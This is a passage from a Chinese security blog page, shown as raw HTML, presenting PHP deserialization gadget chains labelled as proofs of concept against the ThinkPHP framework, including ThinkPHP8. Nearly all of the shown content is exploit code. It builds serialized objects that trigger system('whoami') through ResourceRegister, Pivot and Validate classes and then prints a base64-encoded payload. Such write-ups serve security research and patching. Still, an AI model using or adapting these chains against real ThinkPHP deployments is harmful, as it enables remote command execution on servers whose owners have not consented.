    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>log<span class="token punctuation">\</span>Channel</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>Psr6Cache</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<hr>
<h1 id="ThinkPHP8"><a href="#ThinkPHP8" class="headerlink" title="ThinkPHP8"></a>ThinkPHP8</h1><p>参考：<a target="_blank" rel="noopener" href="https://www.aiwin.fun/index.php/archives/4422/">https://www.aiwin.fun/index.php/archives/4422/</a></p>
<p>官方文档：<a target="_blank" rel="noopener" href="https://doc.thinkphp.cn/v8_0/">https://doc.thinkphp.cn/v8_0/</a></p>
<h2 id="poc-4"><a href="#poc-4" class="headerlink" title="poc"></a>poc</h2><p>链子1：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>concern</span><span class="token punctuation">;</span>

<span class="token keyword">trait</span> <span class="token class-name-definition class-name">Attribute</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token operator">=></span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$withAttr</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token operator">=></span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$json</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span>

<span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token package">model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Attribute</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span>

<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>route</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Resource</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">rule</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1.1"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">option</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"var"</span> <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"1"</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">ResourceRegister</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$resource</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">resource</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Resource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">resource</span><span class="token operator">-></span><span class="token function">parseGroupRule</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">resource</span><span class="token operator">-></span><span class="token function">getRule</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRegister</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>链子2：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>VarDumper<span class="token punctuation">\</span>Cloner</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Stub</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>VarDumper<span class="token punctuation">\</span>Caster</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>VarDumper<span class="token punctuation">\</span>Cloner<span class="token punctuation">\</span>Stub</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">ConstStub</span> <span class="token keyword">extends</span> <span class="token class-name">Stub</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token operator">=</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span>


<span class="token keyword">use</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>VarDumper<span class="token punctuation">\</span>Caster<span class="token punctuation">\</span>ConstStub</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Validate</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$type</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">type</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"visible"</span><span class="token operator">=></span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$append</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"a"</span><span class="token operator">=></span><span class="token string double-quoted-string">"1.1"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$relation</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$visible</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">relation</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"1"</span><span class="token operator">=></span><span class="token keyword">new</span> <span class="token class-name">Validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">visible</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"1"</span><span class="token operator">=></span><span class="token keyword">new</span> <span class="token class-name">ConstStub</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//不能为字符串,怎么办？</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span>

<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>route</span><span class="token punctuation">;</span>


<span class="token keyword">use</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>VarDumper<span class="token punctuation">\</span>Caster<span class="token punctuation">\</span>ConstStub</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Validate</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Resource</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">rule</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1.1"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">option</span> <span class="token operator">=</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"var"</span> <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"1"</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">class</span> <span class="token class-name-definition class-name">ResourceRegister</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$resource</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">resource</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Resource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">resource</span><span class="token operator">-></span><span class="token function">parseGroupRule</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">resource</span><span class="token operator">-></span><span class="token function">getRule</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRegister</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>